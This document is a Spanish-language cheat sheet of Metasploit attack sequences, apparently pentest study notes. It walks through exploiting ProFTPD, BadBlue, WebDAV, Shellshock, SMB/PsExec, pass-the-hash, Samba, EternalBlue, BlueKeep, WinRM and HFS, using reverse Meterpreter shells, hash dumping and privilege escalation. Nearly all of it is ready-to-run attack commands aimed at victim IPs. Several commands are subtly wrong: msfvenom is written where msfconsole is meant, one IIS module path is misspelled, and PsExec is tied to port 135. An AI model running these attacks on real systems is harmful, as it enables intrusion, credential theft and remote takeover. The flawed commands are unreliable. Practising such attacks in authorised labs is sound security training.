# Exploit con Metasploit

Tags: #Metasploit #WebDav #BadBlue #SMB #BlueKeep #Samba #EternalBlue #FTP #HFS 

## Puerto 21 FTP

```bash 
# Explotaremos la vulnerabilidad de Ftpd -> Proftpd versiones: (1.3.3c)
❯ msfvenom -q                  # q = Quitar el banner de inicio

	❯ use exploit/unix/ftp/proftpd_133c_backdoor          # Usamos el exploit                
	❯ options
	❯ set RHOSTS 192.168.68.1                     
	❯ exploit

❯ ctrl + z                   # Colocas la sesion en 'Background'
❯ sessions                   # Miramos las sesiones activas 
❯ sessions -u <ID>           # Regresamos a la sesion y lo hara con Meterpreter
```

Si ya tenemos una sesión activa como root, podemos usar el siguiente modulo para el **'dumpeo de hashes'** de los usuarios existentes. 
```bash 
	❯ use post/linux/gather/hashdump          # Usamos el exploit                
	❯ options
	❯ set SESSION <ID>                        # Colocamos la sesion que ya tenemos activa en el 'Background'                      
	❯ run 
```
## HTTP 80

## BadBlue 2.7 Windows 

Es un File-Sharing web Services, puedes 'dumpear los hashes' así como también hacer 'pass the hash'. 

```bash 
# Explotaremos la vulnerabilidad badblue 2.7
❯ msfvenom -q                  # q = Quitar el banner de inicio

	❯ use exploit/windows/http/badblue_ext_passthruerflow         # Usamos el exploit                
	❯ options
	❯ set RHOSTS 192.168.68.1                     
	❯ exploit
```

## WebDAV

```bash 
# Si ya tenemos un archivo malicioso hecho en msfvenom listo para ejecutar en el servidor victima, podemos hacer lo siguiente y nos pondriamos en 'listening'
❯ msfvenom -q                  # q = Quitar el banner de inicio

	❯ use multi/handler                 
	❯ set payload windows/meterpreter/reverse_tcp           # Colocamos el mismo payload que en el msfvenom
	❯ options
	❯ set LHOST 192.168.68.1                     
	❯ set LPORT 1234
	❯ run
```

```bash 
# Nos proveera una sesion de Meterpreter en un Webdav
❯ msfvenom -q                     # q = Quitar el banner de inicio

	❯ search iis upload                                  # Buscamos el exploit a usar
	❯ use exploit/windows/iss/iss_webdav_upload_asp	   # Usamos el exploit
	❯ options
	❯ set LHOST 192.168.68.1                     
	❯ set LPORT 1234
	❯ set HttpUsername <user>                            # Debemos de colocar credenciales validas 
	❯ set HttpPassword <passwd>
	❯ set RHOSTS 192.168.1.194                           # Colocamos la IP de la maquina victima
	❯ set PATH /webdav/metasploit.asp                    # Colocamos la ruta y el nombre del archivo 
	❯ exploit
```

## Shellshock (CVE-2014-6271)

```bash 
# Explotaremos la vulnerabilidad de Shellshock
❯ msfvenom -q                  # q = Quitar el banner de inicio

	❯ use exploit/multi/http/apache_mod_cgi_bash_env_exec                 
	❯ options
	❯ set RHOSTS 192.168.68.1                     
	❯ set TARGETURI /gettime.cgi
	❯ exploit
```

## Puerto 445 

## SMB

```bash 
# Usaremos el PsExec del puerto 135
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ use exploit/windows/smb/psexec               # Usamos el exploit
	❯ options
	❯ set RHOSTS 192.168.1.194                     # Colocamos la IP de la maquina victima
	❯ set SMBPass <passwd>
	❯ set SMBUser Administrator
	❯ exploit 
```

## Pass the hash

```bash 
❯ use exploit/windows/smb/psexec        # Usamos el exploit para hacer pass the hash              
❯ options
❯ set RHOSTS 192.168.68.1   
❯ set LPORT 443
❯ set SMBUser Administrator
❯ set SMBPass <hash>                    # Pegamos todo el hash obtenido 
❯ set target Native\ upload 
❯ exploit
```

## Samba 

```bash 
# Algunas versiones de Samaba con exploit son: (3.0.20)
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ search samba 
	❯ use exploit/multi/samba/usermap_script       # Usamos el exploit
	❯ options
	❯ set RHOSTS 192.168.1.194                     # Colocamos la IP de la maquina victima
	❯ set LHOST 192.168.1.157                     # Colocamos la IP de nuestra maquina 
	❯ exploit 
	❯ shell 
```

## EternalBlue (CVE-2017-0144)

```bash 
# Usaremos el EternalBlue SMBv1
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ use exploit/windows/smb/ms17_010_eternalblue      # Usamos el exploit
	❯ options
	❯ set payload windows/x64/meterpreter/reverse_tcp
	❯ set LHOST 192.168.1.157                          # Colocamos la IP de nuestra maquina 
	❯ set RHOSTS 192.168.1.194                         # Colocamos la IP de la maquina victima
	❯ exploit 
```

## Puerto 3389 BlueKeep

* Servicio 'ms-wbt-server'

```bash 
# Usaremos el BlueKeep para el RDP, solo funciona en x64 de Windows 
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ use exploit/windows/rdp/cve_2019_0708_bluekeep_rce      # Usamos el exploit
	❯ options
	❯ set payload windows/x64/meterpreter/reverse_tcp
	❯ set LHOST 192.168.1.157   
	❯ set RHOSTS 192.168.1.194                                # Colocamos la IP de la maquina victima
	❯ show targets                                            # Nos muestra los diferentes targets
	❯ set target <windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 15.1)>  # Colocamos la arquitectura en donde se esta ejecutando la maquina victima 
	❯ exploit
```

## Puerto 5985-6 WinRM

```bash 
# Usaremos el WinRM 
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ use exploit/windows/winrm/winrm_script_exec      # Usamos el exploit
	❯ options
	❯ set payload windows/x64/meterpreter/reverse_tcp
	❯ set LHOST 192.168.1.157                          # Colocamos la IP de nuestra maquina 
	❯ set RHOSTS 192.168.1.194                         # Colocamos la IP de la maquina victima
	❯ set FORCE_VBS true                               
	❯ set USERNAME administrator
	❯ set PASSWORD <passwd>
	❯ exploit 
```

----
# Escalada de privilegios 

## Kernel Windows / Linux / MacOS

```bash 
# Reconocimiento de los exploits locales que podemos explotar en la maquina victima 
# Necesitamos tenr una sesion activa de la maquina victima 

❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ use post/multi/recon/local_exploit_suggester        # Usamos el exploit
	❯ options
	❯ set session <ID>          # Colocamos el numero de la session activa de la maquina victima 
	❯ run 
	
	❯ use <exploit_name>        # Usamos algun exploit de los que nos muestra
	❯ show options 
	❯ set session <ID>
	❯ set LPORT 443
	❯ exploit
```

## HFS 2.3 Windows (Http File Server)

```bash 
# Este exploit sirve para explotar un HttpFileServer
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ use exploit/windows/http/rejetto_hfs_exec        # Usamos el exploit 
	❯ options
	❯ set RHOSTS 192.168.1.194                         # Colocamos la IP de la maquina victima
	❯ set LHOST 192.168.1.10                           # Colocamos nuestra IP (En caso de que estemos en una VPN)
	❯ exploit 
	❯ shell                                            # Creamos una sesion Shell para colocar los comandos mas facilmente
```


